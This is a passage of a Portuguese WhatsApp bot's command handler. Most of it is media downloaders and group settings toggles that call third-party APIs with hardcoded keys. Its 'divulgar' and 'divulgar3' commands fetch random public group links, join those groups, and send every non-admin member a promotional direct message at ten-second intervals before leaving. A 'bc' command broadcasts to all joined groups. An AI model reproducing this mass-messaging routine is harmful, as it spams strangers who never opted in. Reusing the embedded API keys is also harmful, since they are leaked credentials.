if(!q.includes("facebook") && !q.includes("fb.watch")) return reply(`Exemplo: ${prefix+command} o link do Facebook`);
reply(enviar.espere)
conn.sendMessage(from, {video: {url: `http://apis.bronxyshost.com/api-bronxys/face_video?url=${q}&apikey=@Luix1397`}, mimetype: "video/mp4"}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break

case 'face_audio':
try {
if(!q.includes("facebook") && !q.includes("fb.watch")) return reply(`Exemplo: ${prefix+command} o link do Facebook`);
reply(enviar.espere)
conn.sendMessage(from, {audio: {url: `http://apis.bronxyshost.com/api-bronxys/face_audio?url=${q}&apikey=@Luix1397`}, mimetype: "audio/mp4"}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break
case 'tiktok':
if(!q.includes("tiktok")) return reply(`Ops, insira o link, só baixo vídeos / audios do ${command} com link`)
sendBtext(from, "✔️ Download De Vídeo / Audio [ TIKTOK ]\nEscolha uma opção que deseja.", `☂️`, [
{buttonId: `${prefix}tiktok_video ${q}`, buttonText: {displayText: `🎥 Video`}, type: 1},
{buttonId: `${prefix}tiktok_audio ${q}`, buttonText: {displayText: `🎵 Audio`}, type: 1}], selo)
if(botoes === false) {
  rply(`Se essa mensagem está sendo enviada, provavelmente os botões estão desligado, caso queira baixar um vídeo ou audio do Tiktok, vou da os exemplos ->\n\nExemplo_video: ${prefix}tiktok_video ${q}\n\nExemplo_audio: ${prefix}tiktok_audio ${q}`)
}
break 
case 'tiktok_audio':
try {
if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);
reply(enviar.espere);
conn.sendMessage(from, {audio: {url:`http://apis.bronxyshost.com/api-bronxys/tiktok?url=${q}&apikey=@Luix1397`}, mimetype: "audio/mp4"}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break
case 'tiktok_video':
try {
if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);
reply(enviar.espere);
conn.sendMessage(from, {video: {url:`http://apis.bronxyshost.com/api-bronxys/tiktok?url=${q}&apikey=@Luix1397`}, mimetype: "video/mp4"}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break
case 'instagram':
case 'instadw':  
if(!q.includes("instagram")) return reply(`Ops, insira o link, só baixo vídeos / audios do ${command} com link`)
if(botoes === false) {
 reply(`Se essa mensagem está sendo enviada, provavelmente os botões estão desligado, caso queira baixar um vídeo ou audio do play, vou da os exemplos ->\n\nExemplo video: ${prefix}videoinsta ${q}\n\nExemplo audio: ${prefix}audioinsta ${q}`)
}
sendBtext(from, "✔️ Download De Vídeo / Audio [ INSTAGRAM ]\nEscolha uma opção que deseja.", `☂️`, [
{buttonId: `${prefix}videoinsta ${q}`, buttonText: {displayText: `🎥 Video`}, type: 1},
{buttonId: `${prefix}audioinsta ${q}`, buttonText: {displayText: `🎵 Audio`}, type: 1}], selo)
if(botoes === false) {
  rply(`Se essa mensagem está sendo enviada, provavelmente os botões estão desligado, caso queira baixar um vídeo ou audio do Instagram, vou da os exemplos ->\n\nExemplo_video: ${prefix}insta_video ${q}\n\nExemplo_audio: ${prefix}insta_audio ${q}`)
}
break 
case 'videoinsta':
try {
if(q.length < 5) return reply(`Exemplo: ${prefix+command} o link`);
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/instagram?url=${q.trim()}=&apikey=@Luix1397`)
reply(enviar.espere)
if(ABC?.msg[0]?.url == undefined) {return reply(ABC?.msg)}
for ( i of ABC?.msg || []) {
if(i?.type == "mp4") {
conn.sendMessage(from, {video: {url: i.url}, mimetype: "video/mp4"}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} else if(i?.type == "jpg") {
conn.sendMessage(from, {image: {url: i.url}}, {quoted: info}).catch(e => {
return reply("Erro..");
})
}}
} catch (e) {
return reply("Erro..")
}
break
case 'audioinsta':
try {
if(!q) return reply(`Exemplo: ${prefix+command} o link`);
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/instagram?url=${q.trim()}=&apikey=@Luix1397`)
reply(enviar.espere)
if(ABC?.msg[0]?.url == undefined) {return reply(ABC?.msg)}
for ( i of ABC?.msg || []) {
if(i?.type == "mp4") {
conn.sendMessage(from, {audio: {url: i.url}, mimetype: "audio/mp4"}, {quoted: info}).catch(e => {
return reply("Erro...")
})
} else if(i?.type == "jpg") {
conn.sendMessage(from, {image: {url: i.url}}, {quoted: info}).catch(e => {
return reply("Erro..");
})
}}
} catch (e) {
return reply("Erro..")
}
break
case 'ytmp4':
case 'play_videoyt':
conn.sendMessage(from, { react: { text: `✅️`, key: info.key }})
try {
if(!q) return reply(`${prefix+command} link ou nome`);
reply(enviar.espere);
conn.sendMessage(from, {video: {url:`http://apis.bronxyshost.com/api-bronxys/play_video?nome_url=${q}&apikey=@Luix1397`}, mimetype: "video/mp4"}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break;
case 'play_audio':
case 'ytmp3':
conn.sendMessage(from, { react: { text: `⏳️`, key: info.key }})
try {
if(!q) return reply(`${prefix+command} link ou nome`);
reply(enviar.espere);
sendMsg = await conn.sendMessage(from, {react: {text: `✅️`, key: info.key}})
conn.sendMessage(from, {audio: {url:`http://apis.bronxyshost.com/api-bronxys/play?nome_url=${q}&apikey=@Luix1397`}, mimetype: "audio/mp4"}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break
case 'divulgar2':
{
if (!SoDono) return reply(enviar.msg.donosmt)
  if (!q) return reply('Cadê o mensagem a qual você deseja divulgar?')
  reply('✔️ Gerando um grupo para divulgar, aguarde!')
  group = await fetchJson(`https://apis.nezsab-apis.xyz/api/linkswhatapp?apikey=${Luix1397}`)
let buttons = [
{buttonId: `${prefix}divulgar3 ${group.resultado.link}+${q}`, buttonText: {displayText: '✔️ Confirmar entrada!'}, type: 1}, 
{buttonId: `${prefix}divulgar ${q}`, buttonText: {displayText: '🔁 Gerar outro grupo!'}, type: 1}]
let thumbInfo = `▢ ⚠︎ *Nome:* ${group.resultado.nome}\n▢ ⌁ *Acessos:* ${group.resultado.acessos}\n▢ ⌁ *Dia publicado:* ${group.resultado.publicado}\n▢ ⌁ *Dia verificado:* ${group.resultado.verificado}\n▢ ⌁ *Link:* ${group.resultado.link}\n\n▢ ⌁ *Descrição do Grupo:*\n${group.resultado.desc}`;
blabla = await getBuffer(`${group.resultado.foto}`);
buttonMessage = {image: blabla, caption: `${thumbInfo}`, footer: `Por: ${setting.NomeDoBot}`, buttons: buttons, headerType: 4}
conn.sendMessage(from, buttonMessage, {quoted: selo})
}
break

case 'divulgar3':
teks = args.join(' ');
if (teks.length < 1) return reply('Coloque o texto! Ele servirá para ser divulgado.');
if (!teks.includes("+")) return reply(`Erro! O uso do ${command} deve conter + entre eles:\n️Exemplo: ${prefix + command} https://chat.whatsapp.com/blanlabla+Seu texto`);
conn.groupAcceptInvite(teks.split('+')[0].split("https://chat.whatsapp.com/")[1]).then(async value => {
const dataGroup = await conn.groupMetadata(value);
const totalMem = dataGroup.participants.filter(i => i.admin === null).map(jid => jid.id);
reply(`▢ ⌁ *Id*: ${dataGroup.id}\n▢ ⌁ *Nome do grupo*: ${dataGroup.subject}\n▢ ⌁ *Criado por*: wa.me/${dataGroup.owner.split('@')[0]}\n▢ ⌁ *Total de Participantes*: ${dataGroup.participants.map((obj) => obj.id).length}\n▢ ⌁ *Total de Adminstradores*: ${dataGroup.participants.filter((obj) => obj.admin).length}`);
const getMembros = dataGroup.participants.map((obj) => obj.id).length
setTimeout(() => reply(`A divulgação com ${getMembros} membros, acabou! Tente outra divulgação.`), getMembros * 10000);
let timestamp = 0;
for (const item of totalMem) {
setTimeout(() => conn.sendMessage(item, {text: teks.split('+')[1]}), timestamp);
timestamp += 10000;
};
sleep(300000).then(() => {
conn.groupLeave(value);
console.log('~> [ GRUPO EXPIRADO ]', color('Saindo do grupo!', 'red'))
reply('Grupo expirado, saindo do grupo!💢')
});
},(err) => {
reply('Algum erro detectado tente novamente mais tarde!');
console.log('Error : %s', color(err, 'red'));
});
break
case 'divulgar': {
if (!SoDono) return reply(enviar.msg.donosmt)
sections = [
{title: `${setting.NomeDoBot}`,
rows: [
{title: "✰ۜ͜͡𝐆𝐑𝐔𝐏𝐎𝐒 𝐃𝐄 𝐀𝐌𝐈𝐙𝐀𝐃𝐄𝐒🫂", rowId: `${prefix}amizadedivu ${q}`, description: `${setting.NomeDoBot}`},
{title: "✰ۜ͜͡𝐆𝐑𝐔𝐏𝐎𝐒 𝐃𝐄 𝐑𝐎𝐌𝐀𝐍𝐂𝐄❤‍🔥", rowId: `${prefix}amorrdivu ${q}`, description: `${setting.NomeDoBot}`},
{title: "✰ۜ͜͡𝐆𝐑𝐔𝐏𝐎𝐒 𝐃𝐄 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒📱", rowId: `${prefix}figdivu ${q}`, description: `${setting.NomeDoBot}`},
{title: "✰ۜ͜͡𝐆𝐑𝐔𝐏𝐎𝐒 𝐃𝐄 𝐃𝐄𝐒𝐄𝐍𝐇𝐎𝐒🎨", rowId: `${prefix}desenhosdivu`, description: `${setting.NomeDoBot}`},
{title: "✰ۜ͜͡𝐆𝐑𝐔𝐏𝐎𝐒 𝐃𝐄 𝐌𝐄𝐌𝐄𝐒😂", rowId: `${prefix}memesdivu ${q}`, description: `${setting.NomeDoBot}`},
{title: "✰ۜ͜͡𝐆𝐑𝐔𝐏𝐎𝐒 𝐃𝐄 𝐅𝐈𝐋𝐌𝐄𝐒/𝐒𝐄𝐑𝐈𝐄𝐒🎥", rowId: `${prefix}fsdivu ${q}`, description: `${setting.NomeDoBot}`}, 
{title: "✰ۜ͜͡𝐆𝐑𝐔𝐏𝐎𝐒 𝐃𝐄 𝐃𝐈𝐕𝐔𝐋𝐆𝐀𝐂̧𝐀𝐎🔗", rowId: `${prefix}linkssdivu ${q}`, description: `${setting.NomeDoBot}`}, 
{title: "✰ۜ͜͡𝐆𝐑𝐔𝐏𝐎𝐒 𝐃𝐄 𝐍𝐀𝐌𝐎𝐑𝐎💏", rowId: `${prefix}namorodivu ${q}`, description: `${setting.NomeDoBot}`}]
},
]
 
const listMessage2 = {
text: `ꪶ𝐃𝐈𝐕𝐔𝐋𝐆𝐀𝐂̧𝐀̃𝐎-𝐆𝐑𝐔𝐏𝐎𝐒ꫂ\nSelecione o tipo de grupo que deseja!`,
  footer: ``,
  title: ``,
  buttonText: "🫂𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🫂️",
  sections
}
sendMsg = await conn.sendMessage(from, listMessage2, {quoted: selo})
}
break
case 'gerargp': {
if (!SoDono) return reply(enviar.msg.donosmt)
reply(`✓ Gerando uma lista de grupos, aguarde um pouco senhor(a)!\n*OPS SE NAO ENVIAR NADA E PORQUE NADA FOI ENCONTRADO*`)
var Lrows = []
let data = await fetchJson(`https://apis.nezsab-apis.xyz/api/randomgp?categoria=${q}&apikey=${Luix1397}`)
for(let a of data.pesquisa.resultado) {
Lrows.push({title: `🔪 Grupo: ${a.nome}`, description: `Descrição: ${a.desc}\nLink do Grupo: ${a.link}`, rowId: `${prefix}divulgar3 ${a.link}+${q}`})
}
listMessage = {
text: `⸺͟͞ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒ꫂ ✰✰✰✰\nSelecione o qual deseja divulgar.`,
footer: `▢ *Categoria:* ${q}`,
title: ``,
buttonText: "🧃𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧃️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(from, listMessage)
}
break
case 'amizadedivu': {
if (!SoDono) return reply(enviar.msg.donosmt)
reply(`✓ Gerando uma lista de grupos, aguarde um pouco senhor(a)!`)
var Lrows = []
let data = await fetchJson(`https://apis.nezsab-apis.xyz/api/randomgp?categoria=amizade&apikey=${Luix1397}`)
for(let a of data.pesquisa.resultado) {
Lrows.push({title: `↪️ Grupo: ${a.nome}`, description: `Descrição: ${a.desc}\nLink do Grupo: ${a.link}\nImagem do Grupo: ${a.imagem}`, rowId: `${prefix}divulgar3 ${a.link}+${q}`})
}
listMessage = {
text: `⸺͟͞ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒ꫂ ✰✰✰✰\nSelecione o qual deseja divulgar.`,
footer: `▢ *Categoria:* Amor e Romance`,
title: ``,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(from, listMessage, {quoted: selo})
}
break

case 'amorrdivu': {
if (!SoDono) return reply(enviar.msg.donosmt)
reply(`✓ Gerando uma lista de grupos, aguarde um pouco senhor(a)!`)
var Lrows = []
let data = await fetchJson(`https://apis.nezsab-apis.xyz/api/randomgp?categoria=amor-e-romance&apikey=${Luix1397}`)
for(let a of data.pesquisa.resultado) {
Lrows.push({title: `↪️ Grupo: ${a.nome}`, description: `Descrição: ${a.desc}\nLink do Grupo: ${a.link}\nImagem do Grupo: ${a.imagem}`, rowId: `${prefix}divulgar3 ${a.link}+${q}`})
}
listMessage = {
text: `⸺͟͞ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒ꫂ ✰✰✰✰\nSelecione o qual deseja divulgar.`,
footer: `▢ *Categoria:* Amor e Romance`,
title: ``,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(from, listMessage, {quoted: selo})
}
break

case 'desenhosdivu': {
if (!SoDono) return reply(enviar.msg.donosmt)
reply(`✓ Gerando uma lista de grupos, aguarde um pouco senhor(a)!`)
var Lrows = []
let data = await fetchJson(`https://apis.nezsab-apis.xyz/api/randomgp?categoria=desenhos-e-animes&apikey=${Luix1397}`)
for(let a of data.pesquisa.resultado) {
Lrows.push({title: `↪️ Grupo: ${a.nome}`, description: `Descrição: ${a.desc}\nLink do Grupo: ${a.link}\nImagem do Grupo: ${a.imagem}`, rowId: `${prefix}divulgar3 ${a.link}+${q}`})
}
listMessage = {
text: `⸺͟͞ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒ꫂ ✰✰✰✰\nSelecione o qual deseja divulgar.`,
footer: `▢ *Categoria:* Desenhos e Animes`,
title: ``,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(from, listMessage, {quoted: selo})
}
break

case 'figdivu': {
if (!SoDono) return reply(enviar.msg.donosmt)
reply(`✓ Gerando uma lista de grupos, aguarde um pouco senhor(a)!`)
var Lrows = []
let data = await fetchJson(`https://apis.nezsab-apis.xyz/api/randomgp?categoria=figurinhas-e-stickers&apikey=${Luix1397}`)
for(let a of data.pesquisa.resultado) {
Lrows.push({title: `↪️ Grupo: ${a.nome}`, description: `Descrição: ${a.desc}\nLink do Grupo: ${a.link}\nImagem do Grupo: ${a.imagem}`, rowId: `${prefix}divulgar3 ${a.link}+${q}`})
}
listMessage = {
text: `⸺͟͞ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒ꫂ ✰✰✰✰\nSelecione o qual deseja divulgar.`,
footer: `▢ *Categoria:* Figurinhas e Stickers`,
title: ``,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(from, listMessage)
}
break

case 'memesdivu': {
if (!SoDono) return reply(enviar.msg.donosmt)
reply(`✓ Gerando uma lista de grupos, aguarde um pouco senhor(a)!`)
var Lrows = []
let data = await fetchJson(`https://apis.nezsab-apis.xyz/api/randomgp?categoria=memes-engracados&apikey=${Luix1397}`)
for(let a of data.pesquisa.resultado) {
Lrows.push({title: `↪️ Grupo: ${a.nome}`, description: `Descrição: ${a.desc}\nLink do Grupo: ${a.link}\nImagem do Grupo: ${a.imagem}`, rowId: `${prefix}divulgar3 ${a.link}+${q}`})
}
listMessage = {
text: `⸺͟͞ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒ꫂ ✰✰✰✰\nSelecione o qual deseja divulgar.`,
footer: `▢ *Categoria:* Memes Engraçados`,
title: ``,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(from, listMessage)
}
break

case 'fsdivu': {
if (!SoDono) return reply(enviar.msg.donosmt)
reply(`✓ Gerando uma lista de grupos, aguarde um pouco senhor(a)!`)
var Lrows = []
let data = await fetchJson(`https://apis.nezsab-apis.xyz/api/randomgp?categoria=filmes-e-series&apikey=${Luix1397}`)
for(let a of data.pesquisa.resultado) {
Lrows.push({title: `↪️ Grupo: ${a.nome}`, description: `Descrição: ${a.desc}\nLink do Grupo: ${a.link}\nImagem do Grupo: ${a.imagem}`, rowId: `${prefix}divulgar3 ${a.link}+${q}`})
}
listMessage = {
text: `⸺͟͞ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒ꫂ ✰✰✰✰\nSelecione o qual deseja divulgar.`,
footer: `▢ *Categoria:* Filmes e Séries`,
title: ``,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(from, listMessage)
}
break

case 'linkssdivu': {
if (!SoDono) return reply(enviar.msg.donosmt)
reply(`✓ Gerando uma lista de grupos, aguarde um pouco senhor(a)!`)
var Lrows = []
let data = await fetchJson(`https://apis.nezsab-apis.xyz/api/randomgp?categoria=links&apikey=${Luix1397}`)
for(let a of data.pesquisa.resultado) {
Lrows.push({title: `↪️ Grupo: ${a.nome}`, description: `Descrição: ${a.desc}\nLink do Grupo: ${a.link}\nImagem do Grupo: ${a.imagem}`, rowId: `${prefix}divulgar3 ${a.link}+${q}`})
}
listMessage = {
text: `⸺͟͞ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒ꫂ ✰✰✰✰\nSelecione o qual deseja divulgar.`,
footer: `▢ *Categoria:* Links e Divulgação`,
title: ``,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(from, listMessage)
}
break

case 'namorodivu': {
if (!SoDono) return reply(enviar.msg.donosmt)
reply(`✓ Gerando uma lista de grupos, aguarde um pouco senhor(a)!`)
var Lrows = []
let data = await fetchJson(`https://apis.nezsab-apis.xyz/api/randomgp?categoria=namoro&apikey=${Luix1397}`)
for(let a of data.pesquisa.resultado) {
Lrows.push({title: `↪️ Grupo: ${a.nome}`, description: `Descrição: ${a.desc}\nLink do Grupo: ${a.link}\nImagem do Grupo: ${a.imagem}`, rowId: `${prefix}divulgar3 ${a.link}+${q}`})
}
listMessage = {
text: `⸺͟͞ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒ꫂ ✰✰✰✰\nSelecione o qual deseja divulgar.`,
footer: `▢ *Categoria:* Grupos de Namoros`,
title: ``,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(from, listMessage)
}
break

case 'bc': case 'bcgroup': case 'transmitir': case 'transmissão': {
if (!SoDono && !isCmdy && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!q) return reply( `Texto onde?\n\nExemplo : ${prefix + command} BOA VISTA `)
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
for (let i of anu) {
await sleep(1500)
let txt = `「 TRANSMISSÃO DO BOT 」\n\n ${q}`
conn.sendMessage(i, {text: txt})
}
reply(`Enviando com sucesso `)
}
break

case 'igstalk':
if(args.length < 1) return reply('Cadê o nome?')
usur = args.join(" ")
teste = await fetchJson(`https://pencarikode.xyz/stalk/instagram?username=${usur}&apikey=pais`)
teste = teste.result.user
corno = `Nome : ${teste.username}\n`
corno += `PK : ${teste.pk}\n`
await conn.sendMessage(from, {image: {url: teste.profile_pic_url}, caption: `${corno}`}, {quoted:info})
break
case 'grupos':
if(!q) return reply("Cadê o título da pesquisa?")
axios.get(`https://alizindev-api.onrender.com/api/search/linkgroupwa?text=${q}&apikey=9d2a2c72`)
.then(e => {
try{
d = e.data;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `*✰͜͡Nome ${i.nama}*\n×*✰͜͡Link ${i.link}*\n\n`;
}
conn.sendMessage(from, {image:{url: `${logo}`}, caption:txt})
}catch(err){
reply(`Nenhum resultado foi encontrado.`)
}
}).catch(err => {
reply('Ops, eu acho que a api ou módulo caiu!')
console.log(err);
});
break
case 'celular':
try {
if(!q) return reply(`Exemplo: ${prefix+command} galaxy a9 2018`);
reply(enviar.espere);
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/info_celular?celular=${q}&apikey=@Luix1397`);
reply(`📱 Celular: ${ABC.celular || "Não encontrado"}\n\nInformações:\n${ABC.resumo || ABC.infoc || "Não encontrado, seja mais específico, a marca e a versão"}`);
} catch (e) {
return reply("Erro...");
}
break
case 'ia':
case 'openai':
case 'chatgpt':
if (args.length < 1) return reply(`Exemplo: ${prefix + command} quem criou o minecraft?`)
try {
let openai = await ia(q) // Defina a key do chatgpt no arquivo ia.js ele está dentro da pasta js
let response = openai[0].resposta
delay(1000)
return reply(response)
} catch(e) {
console.log(e)
return reply('*💦Oops, não e possível utilizar o comando até a key do chatgpt seja definida...*')
}
break

case 'clima':
if (q < 3) return enviar('Insira o nome da sua cidade.')
try {
res = await climaDl(q)
desc = `🌸 Clima 🌥\n\n🌷 Local: ${res[0].lugar}\n🌐 Continente: ${res[0].continente}\n🌪️️ Clima: ${res[0].clima}\n♨️ Temperatura: ${res[0].temperatura}\n🔥 Temperatura Max: ${res[0].temperatura_max}\n❄ Temperatura Minima: ${res[0].temperatura_minima}\n👁️‍🗨️ Visibilidade: ${res[0].visibilidade}\n🌧 Umidade: ${res[0].umidade}\n🌫 Velocidade Vento: ${res[0].vento}`
conn.sendMessage(from, { text: desc }, {quoted: selo})
} catch(e) {
console.log(e)
enviar(resposta.erro)
}
break
case 'mediafire':
try {
if(!q.includes("mediafire.com")) return reply("Faltando o link do mediafire para download do arquivo, cade?");
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/mediafire?url=${q}&apikey=@Luix1397`)
reply(`🌪️Enviando: ${ABC.resultado[0].nama}\n\n⚖️Peso: ${ABC.resultado[0].size}`)
conn.sendMessage(from, {document: {url: ABC.resultado[0].link}, mimetype: "application/"+ABC.resultado[0].mime, fileName: ABC.resultado[0].nama}).catch(e => {
return reply("Erro..");
})
} catch (e) {
return reply("Erro..")
}
break
case 'signo':
try {
if(!q) return reply(`Digite seu signo, exemplo: ${prefix+command} virgem`);
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/horoscopo?signo=${q}&apikey=@Luix1397`)
conn.sendMessage(from, {image: {url: ABC.img}, caption: `Signo: ${q}\n\n${ABC.title}\n${ABC.body}`}).catch(e => {
return reply("Erro..");
})
} catch (e) {
return reply("Erro..");
}
break
case 'gimage':
try {
if(!q) return reply(`Exemplo: ${prefix+command} naruto`)
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/google-img?nome=${q}&apikey=@Luix1397`);
conn.sendMessage(from, {image: {url: ABC[Math.floor(Math.random() * ABC.length)].url}}).catch(() => {
return reply("Erro..");
}, {quoted: info})
} catch (e) {
return reply("Erro..");
}
break;
case 'join': case 'entrar':
if (!SoDono) return reply('Somente proprietário!')
string = args.join(' ')
if (!string) return reply('Insira um link de convite ao lado do comando.')
if (string.includes('chat.whatsapp.com/') || reply('Ops, verifique o link que você inseriu.') ) {
link = string.split('app.com/')[1]
try {
await conn.groupAcceptInvite(`${link}`)
} catch(erro) {
if (String(erro).includes('resource-limit') ) {
reply('O grupo já está com o alcance de 257 membros.')
}
if (String(erro).includes('not-authorized') ) {
reply('Não foi possível entrar no grupo.\nMotivo: Banimento.')
}
}
}
break

//============(CASE-BEM-VINDO/E ETC..)=========\\

case 'bemvindo':
case 'welcome':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if(!SoDono) return reply("Comando Desativado temporariamente para teste...")
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isWelkom) return reply('Ja esta ativo')
welkom.push(from)
fs.writeFileSync('./datab/grupos/welkom.json', JSON.stringify(welkom))
reply('🌀 Ativou com sucesso o recurso de bem vindo neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isWelkom) return reply('Ja esta Desativado')
pesquisar = from
processo = welkom.indexOf(pesquisar)
while(processo >= 0){
welkom.splice(processo, 1)
processo = welkom.indexOf(pesquisar)
}
fs.writeFileSync('./datab/grupos/welkom.json', JSON.stringify(welkom))
reply('‼️ Desativou com sucesso o recurso de bemvindo neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

//=====================================\\



//=================(ANTS)=================\\

case 'antictt':
case 'anticontato':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntiCtt) return reply('Ja esta ativo')
antictt.push(from)
fs.writeFileSync('./datab/ants/antictt.json', JSON.stringify(antictt))
reply('🌀 Ativou com sucesso o recurso de anticontato neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAntiCtt) return reply('Ja esta Desativado')
pesquisar = from
processo = antictt.indexOf(pesquisar)
while(processo >= 0){
antictt.splice(processo, 1)
processo = antictt.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antictt.json', JSON.stringify(antictt))
reply('‼️ Desativou com sucesso o recurso de anticontato neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'anticatalogo':
case 'anticatalg':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAnticatalogo) return reply('Ja esta ativo')
anticatalogo.push(from)
fs.writeFileSync('./datab/ants/anticatalogo.json', JSON.stringify(anticatalogo))
reply('🌀 Ativou com sucesso o recurso de anticatalogo neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAnticatalogo) return reply('Ja esta Desativado')
pesquisar = from
processo = anticatalogo.indexOf(pesquisar)
while(processo >= 0){
anticatalogo.splice(processo, 1)
processo = anticatalogo.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/anticatalogo.json', JSON.stringify(anticatalogo))
reply('‼️ Desativou com sucesso o recurso de anticatalogo neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'botoff':
case 'boton':
if (!isGroup) return reply(enviar.msg.grupo)
if(!SoDono) return reply("Só dono pode executar esta ação...")
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (botoff.includes(from)) return reply('Ja esta ativo')
botoff.push(from)
fs.writeFileSync('./datab/grupos/botoff.json', JSON.stringify(botoff))
reply('*BOT ONLINE NOVAMENTE* 🔥')
} else if (Number(args[0]) === 0) {
if (!botoff.includes(from)) return reply('Ja esta Desativado')
pesquisar = from
processo = botoff.indexOf(pesquisar)
while(processo >= 0){
botoff.splice(processo, 1)
processo = botoff.indexOf(pesquisar)
}
fs.writeFileSync('./datab/grupos/botoff.json', JSON.stringify(botoff))
reply(`*BOT OFFLINE* ✋`)
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antifake':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntifake) return reply('Ja esta ativo')
antifake.push(from)
fs.writeFileSync('./datab/ants/antifake.json', JSON.stringify(antifake))
reply('🌀 Ativou com sucesso o recurso de antifake neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAntifake) return reply('Ja esta Desativado')
pesquisar = from
processo = antifake.indexOf(pesquisar)
while(processo >= 0){
antifake.splice(processo, 1)
processo = antifake.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antifake.json', JSON.stringify(antifake))
